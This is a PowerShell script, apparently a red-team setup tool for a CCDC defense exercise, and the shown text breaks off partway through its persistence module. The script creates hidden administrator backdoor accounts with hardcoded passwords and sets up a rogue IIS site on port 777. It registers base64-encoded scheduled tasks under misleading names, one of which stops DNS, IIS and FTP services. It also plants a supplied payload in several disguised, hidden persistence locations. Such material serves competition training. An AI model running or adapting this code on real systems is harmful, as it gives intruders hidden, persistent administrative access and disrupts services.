# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
# CCDC Windows Combined Setup Script
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
# Combines attack setup scripts from SetupScripts/windows/, EXCEPT the target
# provisioning script (CCDC_Windows_TargetSetup_HTTP_FTP_DNS.ps1).
#
# Modules (each mirrors its standalone script):
#   1. Rogue Users       - CCDC_Windows_Users_UsersAreInYourWalls.ps1
#                         (3 backdoor Domain Admin accounts with adminCount=1)
#   2. Web Shell         - CCDC_Windows_WebShell_SheWebShellOnMyIIS.ps1
#                         (rogue IIS site on port 777 with ASP page)
#   3. Scheduled Tasks   - CCDC_Windows__ScheduledTasks_ScheduledTaskinator.ps1
#                         (2 tasks: Notepad alert every 3 min + service killer every 3 min)
#   4. Persistence       - CCDC_Windows_Persist_ClusterShells.ps1
#                         (7-location startup persistence; supports PS1 and EXE; prompts for payload path)
#   5. Defender Neuter   - CCDC_Windows_DefenderNeuter.ps1
#                         (disable Defender, Firewall, Security Center)
#   6. Remote Access     - CCDC_Windows_RemoteAccess_OpenDoorPolicy.ps1
#                         (misconfigure RDP, WinRM, SSH, Telnet, SNMP)
#   7. LSA Loot          - CCDC_Windows_LSA_LootTheVault.ps1
#                         (LSA SSP/CredProvider/AppInit credential harvesting simulation)
#   8. DLL Hook          - CCDC_Windows_DLL_HookLineAndSinker.ps1
#                         (AppInit_DLLs, AppCert DLLs, search-order hijack artifacts)
#   9. SysInternals      - CCDC_Windows_SysInternals_SysInternalsNuker.ps1
#                         (7-layer block: IFEO, AppLocker, hosts, WebClient, FW, ACL, watchdog)
#
# Usage:
#   Interactive menu  : .\CCDC_Windows_COMBINED.ps1
#   Run specific mods : .\CCDC_Windows_COMBINED.ps1 -Modules Users,WebShell
#   Run all silently  : .\CCDC_Windows_COMBINED.ps1 -Modules Users,WebShell,ScheduledTasks,Persistence
#
# Run as Administrator (PowerShell 5.1+)
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

#Requires -RunAsAdministrator

param(
    # Supply module names to skip the interactive menu.
    # Valid values: Users, WebShell, ScheduledTasks, Persistence
    # Numbers 1-4 also accepted.  Example: -Modules Users,WebShell
    [string[]]$Modules = @()
)

Set-StrictMode -Version Latest
$ErrorActionPreference = "Stop"

# -- Colour helpers (shared by every section) ----------------------------------
function Write-Info    { param($m) Write-Host "[*] $m" -ForegroundColor Cyan   }
function Write-Success { param($m) Write-Host "[+] $m" -ForegroundColor Green  }
function Write-Warn    { param($m) Write-Host "[!] $m" -ForegroundColor Yellow }
function Write-Err     { param($m) Write-Host "[-] $m" -ForegroundColor Red    }
function Write-Section { param($m) Write-Host "`n====[ $m ]====" -ForegroundColor Magenta }

Write-Host ""
Write-Warn "================================================================"
Write-Warn " CCDC Windows Combined Setup"
Write-Warn "================================================================"
Write-Host ""

# =============================================================================
# 1. ROGUE USERS  - Local backdoor accounts (no AD required)
# (from CCDC_Windows_Users_UsersAreInYourWalls.ps1)
# =============================================================================
function Invoke-RogueUsers {
    Write-Section "1/9  - Rogue Users: local backdoor accounts"

    # Tier A: Administrators
    # Tier B: Administrators + Remote Desktop Users
    # Tier C: Backup Operators + Remote Desktop Users
    $EvilUsers = @(
        [PSCustomObject]@{ Sam = "svc_iisapppool";  DisplayName = "IIS AppPool Svc";  Password = "IIS@Svc2024!";    Description = "IIS application pool identity";                    Tier = "A" },
        [PSCustomObject]@{ Sam = "svc_backup";      DisplayName = "Backup Service";   Password = "Bkp@Svc2024!";    Description = "Scheduled backup task service account";            Tier = "A" },
        [PSCustomObject]@{ Sam = "SolarWindsAgent"; DisplayName = "SolarWinds";       Password = "SW0rion@2024!";   Description = "SolarWinds Orion agent (do not disable)";          Tier = "A" },
        [PSCustomObject]@{ Sam = "CrowdStrikeCS";   DisplayName = "CrowdStrike";      Password = "Cs@Falc0n2024!";  Description = "CrowdStrike Falcon sensor service account";         Tier = "A" },
        [PSCustomObject]@{ Sam = "KayneWhitney";    DisplayName = "Kayne Whitney";    Password = "F@keUs3r@2024!";  Description = "Exchange migration service account";                Tier = "A" },
        [PSCustomObject]@{ Sam = "svc_monitoring";  DisplayName = "Monitoring Svc";   Password = "M0n!tor2024@";    Description = "Infrastructure health monitor";                    Tier = "B" },
        [PSCustomObject]@{ Sam = "helpdesk_admin";  DisplayName = "Help Desk";        Password = "H3lpD3sk@2024!";  Description = "Tier-2 helpdesk elevated access account";          Tier = "B" },
        [PSCustomObject]@{ Sam = "NessusScanner";   DisplayName = "Nessus Agent";     Password = "N3ssus@Sc4n24!";  Description = "Tenable Nessus vulnerability scanner agent";       Tier = "B" },
        [PSCustomObject]@{ Sam = "SplunkForwarder"; DisplayName = "Splunk Fwd";       Password = "Spl@Fwd2024!";   Description = "Splunk universal forwarder service account";        Tier = "B" },
        [PSCustomObject]@{ Sam = "wsus_svc";        DisplayName = "WSUS Service";     Password = "Wsus@Upd2024!";   Description = "Windows Server Update Services account";           Tier = "C" },
        [PSCustomObject]@{ Sam = "OneDriveSync";    DisplayName = "OneDrive Sync";    Password = "0ne@Drv2024!";    Description = "OneDrive for Business sync agent";                 Tier = "C" },
        [PSCustomObject]@{ Sam = "net_probe";       DisplayName = "Network Probe";    Password = "N3t@Pr0be2024!";  Description = "Network connectivity probe (IT Ops)";              Tier = "C" },
        [PSCustomObject]@{ Sam = "DefaultUser0";    DisplayName = "Default User";     Password = "Def@Usr2024!";    Description = "Default user profile (do not remove)";             Tier = "C" }
    )

    $SpecialAccountsPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
    if (-not (Test-Path $SpecialAccountsPath)) {
        New-Item -Path $SpecialAccountsPath -Force | Out-Null
    }

    foreach ($u in $EvilUsers) {
        Write-Info "Processing: $($u.Sam) [Tier $($u.Tier)] ..."
        $SecurePass = ConvertTo-SecureString $u.Password -AsPlainText -Force

        $existing = Get-LocalUser -Name $u.Sam -ErrorAction SilentlyContinue
        if ($existing) {
            Write-Warn "  '$($u.Sam)' already exists -- skipping creation."
        } else {
            try {
                New-LocalUser `
                    -Name                 $u.Sam `
                    -Password             $SecurePass `
                    -FullName             $u.DisplayName `
                    -Description          $u.Description `
                    -PasswordNeverExpires:$true `
                    -ErrorAction          Stop
                Write-Success "  Created  : $($u.Sam)  pass: $($u.Password)"
            } catch {
                Write-Err "  Failed to create '$($u.Sam)': $_"
                continue
            }
        }

        $groups = switch ($u.Tier) {
            "A" { @("Administrators") }
            "B" { @("Administrators", "Remote Desktop Users") }
            "C" { @("Backup Operators", "Remote Desktop Users") }
        }
        foreach ($group in $groups) {
            try {
                Add-LocalGroupMember -Group $group -Member $u.Sam -ErrorAction Stop
                Write-Success "  Group    : $group"
            } catch {
                if ($_ -match "already a member") {
                    Write-Warn "  Already in $group."
                } else {
                    Write-Err "  Could not add to '$group': $_"
                }
            }
        }

        try {
            New-ItemProperty -Path $SpecialAccountsPath -Name $u.Sam -Value 0 -PropertyType DWORD -Force | Out-Null
            Write-Success "  Hidden   : login screen suppressed"
        } catch {
            Write-Warn "  Could not set SpecialAccounts key for '$($u.Sam)': $_"
        }

        Write-Host ""
    }
}

# =============================================================================
# 2. WEB SHELL  - rogue IIS site on port 777
# (from CCDC_Windows_WebShell_SheWebShellOnMyIIS.ps1)
# =============================================================================
function Invoke-RogueWebShell {
    Write-Section "2/9  - Web Shell: Rogue IIS site on port 777"

    $SiteName    = "evilwebpage"
    $SitePort    = 777
    $SitePath    = "C:\inetpub\$SiteName"
    $AppPoolName = "DefaultApp_Pool"

    Write-Info "Checking IIS installation..."

    $iisFeature = Get-WindowsFeature -Name Web-Server -ErrorAction SilentlyContinue
    if (-not $iisFeature.Installed) {
        Write-Warn "IIS not installed  -  installing Web-Server role (this may take a minute)..."
        try {
            Install-WindowsFeature -Name Web-Server, Web-Mgmt-Tools, Web-ASP -IncludeManagementTools -ErrorAction Stop | Out-Null
            Write-Success "IIS installed successfully."
        } catch {
            Write-Err "Failed to install IIS: $_"
            exit 1
        }
    } else {
        Write-Success "IIS is already installed."
    }

    $aspFeature = Get-WindowsFeature -Name Web-ASP -ErrorAction SilentlyContinue
    if ($aspFeature -and -not $aspFeature.Installed) {
        Write-Info "Installing Web-ASP feature..."
        try {
            Install-WindowsFeature -Name Web-ASP -ErrorAction Stop | Out-Null
            Write-Success "Web-ASP installed."
        } catch {
            Write-Err "Failed to install Web-ASP: $_"
            exit 1
        }
    }

    try {
        Import-Module WebAdministration -ErrorAction Stop
        Write-Success "WebAdministration module loaded."
    } catch {
        Write-Err "Could not load WebAdministration module: $_"
        exit 1
    }

    Write-Info "Creating web root: $SitePath ..."
    if (-not (Test-Path $SitePath)) {
        New-Item -ItemType Directory -Path $SitePath -Force | Out-Null
        Write-Success "Directory created: $SitePath"
    } else {
        Write-Warn "Directory already exists: $SitePath"
    }

    Write-Info "Writing evilwebpage ASP page..."
    $HtmlContent = @'
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>evilwebpage</title>
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      background: #0a0a0a;
      color: #ff2222;
      font-family: 'Courier New', Courier, monospace;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      text-align: center;
      padding: 2rem;
      overflow: hidden;
    }

    /* Scanline overlay */
    body::before {
      content: "";
      position: fixed;
      inset: 0;
      background: repeating-linear-gradient(
        to bottom,
        transparent 0px,
        transparent 3px,
        rgba(0,0,0,0.15) 3px,
        rgba(0,0,0,0.15) 4px
      );
      pointer-events: none;
      z-index: 10;
    }

    h1 {
      font-size: clamp(2.8rem, 9vw, 7rem);
      font-weight: 900;
      letter-spacing: 0.04em;
      text-transform: uppercase;
      text-shadow:
        0 0 10px  #ff0000,
        0 0 40px  #ff000088,
        0 0 100px #ff000033;
      animation: flicker 3s ease-in-out infinite;
    }

    @keyframes flicker {
      0%,100% { opacity: 1;   text-shadow: 0 0 10px #ff0000, 0 0 40px #ff000088; }
      92%      { opacity: 1;   text-shadow: 0 0 10px #ff0000, 0 0 40px #ff000088; }
      93%      { opacity: 0.4; text-shadow: none; }
      94%      { opacity: 1;   text-shadow: 0 0 10px #ff0000, 0 0 40px #ff000088; }
      96%      { opacity: 0.6; text-shadow: none; }
      97%      { opacity: 1;   text-shadow: 0 0 10px #ff0000, 0 0 40px #ff000088; }
    }

    .tagline {
      margin-top: 1.5rem;
      font-size: clamp(0.9rem, 2.5vw, 1.2rem);
      color: #ff6666;
      letter-spacing: 0.1em;
      opacity: 0.85;
    }

    .divider {
      margin: 2.5rem auto;
      width: min(500px, 80%);
      border: none;
      border-top: 1px solid #330000;
    }

    .meta {
      font-size: 0.72rem;
      color: #444;
      line-height: 2;
      letter-spacing: 0.05em;
    }

    .meta .label { color: #882222; }

    .blink {
      animation: blink 1.2s step-start infinite;
    }
    @keyframes blink { 50% { opacity: 0; } }
  </style>
</head>
<body>

  <h1>evilwebpage</h1>
  <p class="tagline">You found a rogue IIS site. <span class="blink">&#9646;</span><br>Investigate. Remediate. Harden.</p>

  <hr class="divider">

  <div class="meta">
    <span class="label">site name&nbsp;&nbsp;&nbsp;:</span> evilwebpage<br>
    <span class="label">server&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:</span> <% Response.Write(Request.ServerVariables("SERVER_NAME")) %><br>
    <span class="label">local addr&nbsp;:</span> <% Response.Write(Request.ServerVariables("LOCAL_ADDR")) %><br>
    <span class="label">server port:</span> <% Response.Write(Request.ServerVariables("SERVER_PORT")) %><br>
    <span class="label">app pool&nbsp;&nbsp;&nbsp;:</span> @@APPPOOL@@<br>
    <span class="label">server sw&nbsp;&nbsp;:</span> <% Response.Write(Request.ServerVariables("SERVER_SOFTWARE")) %><br>
    <span class="label">timestamp&nbsp;&nbsp;:</span> <% Response.Write(Now()) %>
  </div>

</body>
</html>
'@

    # Replace the placeholder with the actual app pool name
    $HtmlContent = $HtmlContent -replace '@@APPPOOL@@', $AppPoolName

    $HtmlContent | Set-Content -Path "$SitePath\index.asp" -Encoding UTF8 -Force
    Write-Success "index.asp written: $SitePath\index.asp"

    Write-Info "Creating application pool: $AppPoolName ..."
    if (Test-Path "IIS:\AppPools\$AppPoolName") {
        Write-Warn "App pool '$AppPoolName' already exists  -  reconfiguring."
        Remove-WebAppPool -Name $AppPoolName -ErrorAction SilentlyContinue
    }

    New-WebAppPool -Name $AppPoolName | Out-Null
    Set-ItemProperty "IIS:\AppPools\$AppPoolName" -Name "startMode"                      -Value "AlwaysRunning"
    Set-ItemProperty "IIS:\AppPools\$AppPoolName" -Name "autoStart"                      -Value $true
    Set-ItemProperty "IIS:\AppPools\$AppPoolName" -Name "processModel.identityType"      -Value 4
    Set-ItemProperty "IIS:\AppPools\$AppPoolName" -Name "recycling.periodicRestart.time" -Value "00:00:00"
    Write-Success "App pool created: $AppPoolName (AlwaysRunning, recycling disabled)"

    if (Get-Website -Name $SiteName -ErrorAction SilentlyContinue) {
        Write-Warn "Site '$SiteName' already exists  -  removing and recreating."
        Remove-Website -Name $SiteName
    }

    Write-Info "Creating IIS site: $SiteName on port $SitePort ..."
    try {
        New-Website `
            -Name            $SiteName `
            -PhysicalPath    $SitePath `
            -ApplicationPool $AppPoolName `
            -Port            $SitePort `
            -IPAddress       "*" `
            -Force `
            -ErrorAction Stop | Out-Null

        Write-Success "IIS site created: $SiteName"
    } catch {
        Write-Err "Failed to create IIS site: $_"
        exit 1
    }

    Set-ItemProperty "IIS:\Sites\$SiteName" -Name "serverAutoStart" -Value $true
    Write-Success "Site set to auto-start on IIS service restart."

    Write-Info "Adding inbound firewall rule for port $SitePort ..."
    $fwRuleName = "evilwebpage-training-port-$SitePort"
    Remove-NetFirewallRule -DisplayName $fwRuleName -ErrorAction SilentlyContinue
    New-NetFirewallRule `
        -DisplayName  $fwRuleName `
        -Direction    Inbound `
        -Protocol     TCP `
        -LocalPort    $SitePort `
        -Action       Allow `
        -Profile      Any `
        -Description  "Training rule - evilwebpage IIS site" | Out-Null
    Write-Success "Firewall rule added: $fwRuleName (TCP $SitePort inbound)"

    Write-Info "Starting site: $SiteName ..."
    Start-Website -Name $SiteName
    $site = Get-Website -Name $SiteName
    if ($site.State -eq "Started") {
        Write-Success "Site is running!"
    } else {
        Write-Err "Site did not start. Check: Get-Website '$SiteName' and Event Viewer > Windows Logs > Application"
    }

    Write-Info "Verifying site responds on localhost:$SitePort ..."
    Start-Sleep -Seconds 2
    try {
        $resp = Invoke-WebRequest -Uri "http://localhost:$SitePort" -UseBasicParsing -TimeoutSec 5 -ErrorAction Stop
        Write-Success "HTTP $($resp.StatusCode) received  -  site is live at http://localhost:$SitePort"
    } catch {
        Write-Warn "Could not reach site locally: $_ (site may still be starting)"
    }
}

# =============================================================================
# 3. SCHEDULED TASKS  - Notepad alert + service killer
# (from CCDC_Windows__ScheduledTasks_ScheduledTaskinator.ps1)
# =============================================================================
function Invoke-ScheduledTasks {
    Write-Section "3/9  - Scheduled Tasks: Notepad alert + service killer"

    # ========== TASK 1: SillyNotepadAlert ==========
    $Task1Name        = "NotepadAlert"
    $Task1Description = "Windows Defender credential cache refresh task (do not disable)"
    $Task1MessageFile = "C:\Windows\Temp\sys_alert_msg.txt"
    $Task1Message     = "AHHHHH MY INTERNALS! STOP RUNNING YOUR CYBERSECURITY TOOLS ON MY BODY! THEY HURT! AS A RESULT, I WILL BE REMOVING REGISTRY FILES EVERY TIME YOU SEE THIS"

    $Task1ScriptBlock = @"
Set-Content -Path '$Task1MessageFile' -Value '$Task1Message' -Force
Start-Process -FilePath 'notepad.exe' -ArgumentList '$Task1MessageFile'
"@

    $Task1Encoded = [Convert]::ToBase64String(
        [System.Text.Encoding]::Unicode.GetBytes($Task1ScriptBlock)
    )

    $Task1Action  = New-ScheduledTaskAction `
        -Execute    "powershell.exe" `
        -Argument   "-NonInteractive -WindowStyle Hidden -EncodedCommand $Task1Encoded"

    $Task1Trigger = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 3) `
        -RepetitionDuration (New-TimeSpan -Days 3650) `
        -Once -At (Get-Date).AddSeconds(10)

    $Task1Settings = New-ScheduledTaskSettingsSet `
        -ExecutionTimeLimit     (New-TimeSpan -Minutes 5) `
        -RestartCount           3 `
        -RestartInterval        (New-TimeSpan -Minutes 1) `
        -StartWhenAvailable     `
        -RunOnlyIfNetworkAvailable:$false

    $Task1Principal = New-ScheduledTaskPrincipal `
        -GroupId   "BUILTIN\Users" `
        -RunLevel  Highest

    Write-Info "Registering scheduled task: $Task1Name ..."

    try {
        Unregister-ScheduledTask -TaskName $Task1Name -Confirm:$false -ErrorAction SilentlyContinue

        Register-ScheduledTask `
            -TaskName   $Task1Name `
            -Action     $Task1Action `
            -Trigger    $Task1Trigger `
            -Settings   $Task1Settings `
            -Principal  $Task1Principal `
            -Description $Task1Description `
            -Force | Out-Null

        Write-Success "Task registered: $Task1Name"
        Write-Success "  Schedule : every 3 minutes"
        Write-Success "  Action   : Notepad opens '$Task1MessageFile'"
        Write-Success "  Runs as  : BUILTIN\Users (interactive session  -  Notepad will be visible)"
    } catch {
        Write-Err "Failed to register ${Task1Name}: $_"
    }

    Write-Host ""

    # ========== TASK 2: SillyServiceKiller ==========
    $Task2Name        = "AcrobatUpdateTask"
    $Task2Description = "Acrobat Update Services maintenance cleanup (system managed)"

    $Task2ScriptBlock = @'
$services = @('DNS','W3SVC','MSFTPSVC')
foreach ($svc in $services) {
    try {
        $s = Get-Service -Name $svc -ErrorAction SilentlyContinue
        if ($s -and $s.Status -eq 'Running') {
            Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue
        }
    } catch {}
}
'@

    $Task2Encoded = [Convert]::ToBase64String(
        [System.Text.Encoding]::Unicode.GetBytes($Task2ScriptBlock)
    )

    $Task2Action  = New-ScheduledTaskAction `
        -Execute  "powershell.exe" `
        -Argument "-NonInteractive -WindowStyle Hidden -EncodedCommand $Task2Encoded"

    $Task2Trigger = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 3) `
        -RepetitionDuration (New-TimeSpan -Days 3650) `
        -Once -At (Get-Date).AddSeconds(30)

    $Task2Settings = New-ScheduledTaskSettingsSet `
        -ExecutionTimeLimit     (New-TimeSpan -Minutes 5) `
        -RestartCount           3 `
        -RestartInterval        (New-TimeSpan -Minutes 1) `
        -StartWhenAvailable     `
        -RunOnlyIfNetworkAvailable:$false

    $Task2Principal = New-ScheduledTaskPrincipal `
        -UserId    "SYSTEM" `
        -LogonType ServiceAccount `
        -RunLevel  Highest

    Write-Info "Registering scheduled task: $Task2Name ..."

    try {
        Unregister-ScheduledTask -TaskName $Task2Name -Confirm:$false -ErrorAction SilentlyContinue

        Register-ScheduledTask `
            -TaskName    $Task2Name `
            -Action      $Task2Action `
            -Trigger     $Task2Trigger `
            -Settings    $Task2Settings `
            -Principal   $Task2Principal `
            -Description $Task2Description `
            -Force | Out-Null

        Write-Success "Task registered: $Task2Name"
        Write-Success "  Schedule : every 3 minutes"
        Write-Success "  Action   : Stop-Service DNS, W3SVC (IIS), MSFTPSVC (FTP)"
        Write-Success "  Runs as  : SYSTEM"
    } catch {
        Write-Err "Failed to register ${Task2Name}: $_"
    }

    Write-Host ""
}

# =============================================================================
# 4. PERSISTENCE  - 5-location startup persistence planter
# (from CCDC_Windows_Persist_ClusterShells.ps1)
# =============================================================================
function Invoke-PersistencePlanter {
    Write-Section "4/9  - Persistence: 7-location startup planter (PS1 + EXE)"

    $PayloadPath = ""
    while ([string]::IsNullOrWhiteSpace($PayloadPath)) {
        $PayloadPath = (Read-Host "  Path to payload script").Trim()
        if ([string]::IsNullOrWhiteSpace($PayloadPath)) {
            Write-Err "Path cannot be empty."
        }
    }

    if (-not (Test-Path $PayloadPath)) {
        Write-Err "Payload not found: $PayloadPath"
        return
    }

    $IsExe = $PayloadPath -match '\.exe$'
    Write-Info "Payload confirmed: $PayloadPath  ($(if ($IsExe) { 'EXE mode' } else { 'PS1 mode' }))"
    Write-Host ""

    $DropDir = "C:\ProgramData\Microsoft\Windows\DiagTrack\Telemetry\cache"
    if (-not (Test-Path $DropDir)) {
        New-Item -ItemType Directory -Path $DropDir -Force | Out-Null
    }
    $dirObj = Get-Item $DropDir -Force
    $dirObj.Attributes = $dirObj.Attributes -bor [System.IO.FileAttributes]::Hidden

    function Get-EncodedCommand { param([string]$ScriptPath)
        $bytes = [System.Text.Encoding]::Unicode.GetBytes((Get-Content $ScriptPath -Raw))
        return [Convert]::ToBase64String($bytes)
    }

    # [1/7] HKLM Run Key
    Write-Info "[1/7] Planting in HKLM Run registry key ..."
    $Reg1Name = "WUDFComponentHost"
    $Reg1Drop = if ($IsExe) { "$DropDir\wudf-host-svc.exe" } else { "$DropDir\wudf-host-svc.ps1" }
    Copy-Item -Path $PayloadPath -Destination $Reg1Drop -Force
    $f1 = Get-Item $Reg1Drop -Force; $f1.Attributes = $f1.Attributes -bor [System.IO.FileAttributes]::Hidden
    $Reg1Cmd = if ($IsExe) { "`"$Reg1Drop`"" } else { "powershell.exe -NonInteractive -WindowStyle Hidden -EncodedCommand $(Get-EncodedCommand $Reg1Drop)" }
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name $Reg1Name -Value $Reg1Cmd -Type String -Force
    Write-Success "  HKLM:\...\CurrentVersion\Run\$Reg1Name"
    Write-Success "  Payload copy: $Reg1Drop (hidden)"
    Write-Host ""

    # [2/7] Winlogon Userinit
    Write-Info "[2/7] Planting in Winlogon Userinit registry key ..."
    $Reg2Key  = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
    $Reg2Drop = if ($IsExe) { "$DropDir\userinit-ext.exe" } else { "$DropDir\userinit-ext.ps1" }
    Copy-Item -Path $PayloadPath -Destination $Reg2Drop -Force
    $f2 = Get-Item $Reg2Drop -Force; $f2.Attributes = $f2.Attributes -bor [System.IO.FileAttributes]::Hidden
    $Reg2Append  = if ($IsExe) { ",$Reg2Drop" } else { ",powershell.exe -NonInteractive -WindowStyle Hidden -EncodedCommand $(Get-EncodedCommand $Reg2Drop)" }
    $Reg2Current = (Get-ItemProperty -Path $Reg2Key -Name Userinit).Userinit
    if ($Reg2Current -notmatch [regex]::Escape("userinit-ext")) {
        Set-ItemProperty -Path $Reg2Key -Name Userinit -Value ($Reg2Current.TrimEnd(',') + $Reg2Append) -Force
    }
    Write-Success "  HKLM:\...\Winlogon\Userinit (appended)"
    Write-Success "  Payload copy: $Reg2Drop (hidden)"
    Write-Host ""

    # [3/7] Hidden scheduled task under \Microsoft\Windows\
    Write-Info "[3/7] Planting hidden scheduled task in \Microsoft\Windows\ subfolder ..."
    $Task3Name  = "DiagnosticsHub-StandardCollector"
    $Task3Path  = "\Microsoft\Windows\DiagnosticsHub\"
    $Task3Drop  = if ($IsExe) { "$DropDir\diaghub-collector.exe" } else { "$DropDir\diaghub-collector.ps1" }
    Copy-Item -Path $PayloadPath -Destination $Task3Drop -Force
    $f3 = Get-Item $Task3Drop -Force; $f3.Attributes = $f3.Attributes -bor [System.IO.FileAttributes]::Hidden
    $Task3Action    = if ($IsExe) {
        New-ScheduledTaskAction -Execute $Task3Drop
    } else {
        New-ScheduledTaskAction -Execute "powershell.exe" `
            -Argument "-NonInteractive -WindowStyle Hidden -EncodedCommand $(Get-EncodedCommand $Task3Drop)"
    }
    $Task3Trigger   = New-ScheduledTaskTrigger -AtStartup
    $Task3Settings  = New-ScheduledTaskSettingsSet -Hidden -ExecutionTimeLimit (New-TimeSpan -Minutes 10) `
        -StartWhenAvailable -RunOnlyIfNetworkAvailable:$false
    $Task3Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
    $TaskSvc = New-Object -ComObject Schedule.Service; $TaskSvc.Connect()
    try { $TaskSvc.GetFolder("\Microsoft\Windows").GetFolder("DiagnosticsHub") } catch {
        $TaskSvc.GetFolder("\Microsoft\Windows").CreateFolder("DiagnosticsHub") | Out-Null
    }
    Unregister-ScheduledTask -TaskName $Task3Name -TaskPath $Task3Path -Confirm:$false -ErrorAction SilentlyContinue
    Register-ScheduledTask -TaskName $Task3Name -TaskPath $Task3Path -Action $Task3Action `
        -Trigger $Task3Trigger -Settings $Task3Settings -Principal $Task3Principal `
        -Description "Microsoft Diagnostics Hub standard data collector service" -Force | Out-Null
    Write-Success "  $Task3Path$Task3Name (hidden)"
    Write-Success "  Payload copy: $Task3Drop (hidden)"
    Write-Host ""

    # [4/7] Windows service (WMI lookalike)
    Write-Info "[4/7] Planting as a Windows service (WMI lookalike) ..."
    $Svc4Name = "WmiPrvSE-Helper"
    $Svc4Drop = if ($IsExe) { "$DropDir\wmiprvse-helper.exe" } else { "$DropDir\wmiprvse-helper.ps1" }
    Copy-Item -Path $PayloadPath -Destination $Svc4Drop -Force
    $f4 = Get-Item $Svc4Drop -Force; $f4.Attributes = $f4.Attributes -bor [System.IO.FileAttributes]::Hidden
    $psExe = "$Env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
    if ($IsExe) {
        $Svc4WrapperPath = "$DropDir\wmiprvse-wrapper.ps1"
        Set-Content -Path $Svc4WrapperPath -Value "`$p = Start-Process -FilePath '$Svc4Drop' -WindowStyle Hidden -PassThru`n`$p.WaitForExit()"
        $fw = Get-Item $Svc4WrapperPath -Force; $fw.Attributes = $fw.Attributes -bor [System.IO.FileAttributes]::Hidden
        $Svc4BinPath = "`"$psExe`" -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$Svc4WrapperPath`""
    } else {
        $Svc4BinPath = "`"$psExe`" -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$Svc4Drop`""
    }
    $existing = Get-Service -Name $Svc4Name -ErrorAction SilentlyContinue
    if ($existing) { Stop-Service -Name $Svc4Name -Force -ErrorAction SilentlyContinue; sc.exe delete $Svc4Name | Out-Null; Start-Sleep -Seconds 2 }
    sc.exe create $Svc4Name binPath= "$Svc4BinPath" start= auto obj= LocalSystem | Out-Null
    sc.exe description $Svc4Name "Provides host process for Windows Management Instrumentation providers." | Out-Null
    sc.exe failure      $Svc4Name reset= 60 actions= restart/5000/restart/5000/restart/5000 | Out-Null
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\$Svc4Name" -Name DisplayName -Value "WMI Provider Service Helper" -Force
    Write-Success "  Service: $Svc4Name (AUTO_START, SYSTEM)"
    Write-Success "  Payload copy: $Svc4Drop (hidden)"
    if ($IsExe) { Write-Success "  EXE wrapper: $Svc4WrapperPath (hidden, WaitForExit keeps service alive)" }
    Write-Host ""

    # [5/7] Active Setup StubPath
    Write-Info "[5/7] Planting in Active Setup Installed Components (StubPath) ..."
    $AS5GUID    = "{89820200-ECBD-11CF-8B85-00AA005B4383}"
    $AS5KeyPath = "HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\$AS5GUID"
    $AS5Drop    = if ($IsExe) { "$DropDir\iecompat-stub.exe" } else { "$DropDir\iecompat-stub.ps1" }
    Copy-Item -Path $PayloadPath -Destination $AS5Drop -Force
    $f5 = Get-Item $AS5Drop -Force; $f5.Attributes = $f5.Attributes -bor [System.IO.FileAttributes]::Hidden
    $AS5StubPath = if ($IsExe) { "`"$AS5Drop`"" } else { "powershell.exe -NonInteractive -WindowStyle Hidden -EncodedCommand $(Get-EncodedCommand $AS5Drop)" }
    if (-not (Test-Path $AS5KeyPath)) { New-Item -Path $AS5KeyPath -Force | Out-Null }
    Set-ItemProperty -Path $AS5KeyPath -Name "(Default)"   -Value "Internet Explorer Core Fonts" -Force
    Set-ItemProperty -Path $AS5KeyPath -Name StubPath      -Value $AS5StubPath -Force
    Set-ItemProperty -Path $AS5KeyPath -Name Version       -Value "1,0,0,0" -Force
    Set-ItemProperty -Path $AS5KeyPath -Name Locale        -Value "EN" -Force
    Set-ItemProperty -Path $AS5KeyPath -Name IsInstalled   -Value 1 -Type DWord -Force
    Write-Success "  HKLM:\...\Active Setup\Installed Components\$AS5GUID"
    Write-Success "  Payload copy: $AS5Drop (hidden)"
    Write-Host ""

    # [6/7] Hidden scheduled task under \Microsoft\Windows\UpdateOrchestrator\
    Write-Info "[6/7] Planting hidden scheduled task (UpdateOrchestrator, every 30 min) ..."
    $Task6Name = "MusNotifyIconHandler"
    $Task6Path = "\Microsoft\Windows\UpdateOrchestrator\"
    $Task6Drop = if ($IsExe) { "$DropDir\musnot-handler.exe" } else { "$DropDir\musnot-handler.ps1" }
    Copy-Item -Path $PayloadPath -Destination $Task6Drop -Force
    $f6 = Get-Item $Task6Drop -Force; $f6.Attributes = $f6.Attributes -bor [System.IO.FileAttributes]::Hidden
    $Task6Action = if ($IsExe) {
        New-ScheduledTaskAction -Execute $Task6Drop
    } else {
        New-ScheduledTaskAction -Execute "powershell.exe" `
            -Argument "-NonInteractive -WindowStyle Hidden -EncodedCommand $(Get-EncodedCommand $Task6Drop)"
    }
    $Task6Trigger   = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 30) `
        -RepetitionDuration (New-TimeSpan -Days 3650) -Once -At (Get-Date).AddSeconds(60)
    $Task6Settings  = New-ScheduledTaskSettingsSet -Hidden -ExecutionTimeLimit (New-TimeSpan -Minutes 10) `
        -StartWhenAvailable -RunOnlyIfNetworkAvailable:$false
    $Task6Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
